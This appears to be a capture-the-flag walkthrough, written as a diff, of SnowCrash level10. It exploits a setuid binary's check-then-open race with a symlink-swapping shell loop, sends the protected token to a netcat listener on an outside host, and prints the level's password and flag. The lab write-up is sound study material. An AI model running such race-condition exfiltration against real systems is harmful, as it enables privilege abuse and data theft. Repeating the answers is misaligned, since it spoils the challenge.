@@ -1,1 +1,65 @@
-
+< level10@SnowCrash:~$ ls -la
+> total 28
+> dr-xr-x---+ 1 level10 level10   140 Mar  6  2016 .
+> d--x--x--x  1 root    users     340 Aug 30  2015 ..
+> -r-x------  1 level10 level10   220 Apr  3  2012 .bash_logout
+> -r-x------  1 level10 level10  3518 Aug 30  2015 .bashrc
+> -rwsr-sr-x+ 1 flag10  level10 10817 Mar  5  2016 level10
+> -r-x------  1 level10 level10   675 Apr  3  2012 .profile
+> -rw-------  1 flag10  flag10     26 Mar  5  2016 token
+< level10@SnowCrash:~$ ./level10
+> ./level10 file host
+>         sends file to host if you have access to it
+< level10@SnowCrash:~$ ./level10 token 192.168.56.1
+> You don't have access to token
+# lets see why it prints that with strings
+< level10@SnowCrash:~$ strings level10
+<> [...]
+> %s file host
+>         sends file to host if you have access to it
+> Connecting to %s:6969 ..
+> Unable to connect to host %s
+> .*( )*.
+> Unable to write banner to host %s
+> Connected!
+> Sending file ..
+> Damn. Unable to open file
+> Unable to read from file: %s
+> wrote file!
+> You don't have access to %s
+# we know that we will need to listen to port 6969 once tricking the binary into launching token file to which
+# we dont have access, lets do a race condition as explained in this video:
+# https://www.youtube.com/watch?v=5g137gsB9Wk&app=desktop but with a shell script since we cant compile this c program
+< level10@SnowCrash:~$ vim /tmp/script.sh
+< level10@SnowCrash:~$ cat /tmp/script.sh
+> #!/bin/sh
+> while [ 1 ]
+> do
+>         touch /tmp/flag
+>         ln -fs /tmp/flag /tmp/swap
+>         ln -fs ~/token /tmp/swap
+> done
+# lets launch it in background so it runs when we launch level10 binary
+< level10@SnowCrash:~$ sh /tmp/script.sh &
+> [1] 4487
+# now lets do a loop to launch level10 binary hoping that it will at some point launch being tricked by the symbolic links
+< level10@SnowCrash:~$ while true; do ./level10  /tmp/swap 192.168.1.85; done
+> Connecting to 192.168.1.85:6969 .. Connected!
+> Sending file .. wrote file!
+> Connecting to 192.168.1.85:6969 .. Connected!
+> Sending file .. wrote file!
+# below is a run that didnt get tricked haha
+> You don't have access to /tmp/swap
+# now back to the host, we can launch a netcat on port 6969 to see if the flag prints
+< foo@DESKTOP-SN4HJPM:~$ nc -lk 6969
+> .*( )*.
+> woupa2yuojeeaaed06riuj63c
+> .*( )*.
+> woupa2yuojeeaaed06riuj63c
+> .*( )*.
+# we can connect to flag10 with this password and launch getflag
+< level10@SnowCrash:~$ su flag10
+< Password:
+> Don't forget to launch getflag !
+< flag10@SnowCrash:~$ getflag
+> Check flag.Here is your token : feulo4b72j7edeahuete3no7c
